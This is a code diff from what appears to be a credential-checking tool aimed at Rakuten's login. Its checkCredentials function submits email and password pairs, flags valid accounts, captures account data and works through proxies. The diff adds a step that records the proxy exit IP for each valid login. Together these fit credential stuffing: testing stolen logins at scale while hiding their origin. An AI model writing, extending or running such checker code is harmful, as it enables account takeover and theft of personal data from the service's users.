@@ -13,6 +13,7 @@ const { createSession, touchSession, closeSession } = require('./automation/http
 const { navigateToLogin, submitEmailStep, submitPasswordStep } = require('./automation/http/httpFlow');
 const { detectOutcome } = require('./automation/http/htmlAnalyzer');
 const { captureAccountData } = require('./automation/http/httpDataCapture');
+const { fetchIpInfo } = require('./automation/http/ipFetcher');
 const { createLogger } = require('./logger');
 const { MIN_USERNAME_LENGTH } = require('./automation/batch/parse');
 
@@ -143,6 +144,23 @@ async function checkCredentials(email, password, options = {}) {
     // Complete session alignment if needed (establishes cookies on www.rakuten.co.jp)
     if (outcome.status === 'VALID' && outcome.needsSessionAlign) {
       await completeSessionAlignment(session, outcome, timeoutMs);
+    }
+
+    // Fetch exit IP for VALID credentials if proxy is configured
+    if (outcome.status === 'VALID' && proxy) {
+      try {
+        onProgress && (await onProgress('ip'));
+        const ipInfo = await fetchIpInfo(session.client, timeoutMs);
+        if (ipInfo.ip) {
+          outcome.ipAddress = ipInfo.ip;
+          log.debug(`Detected exit IP: ${ipInfo.ip}`);
+        } else {
+          log.debug(`Failed to fetch IP: ${ipInfo.error}`);
+        }
+      } catch (ipError) {
+        log.warn(`IP fetch error during credential check: ${ipError.message}`);
+        // Don't fail the credential check if IP fetch fails
+      }
     }
 
     preserveSession = deferCloseOnValid && outcome.status === 'VALID';
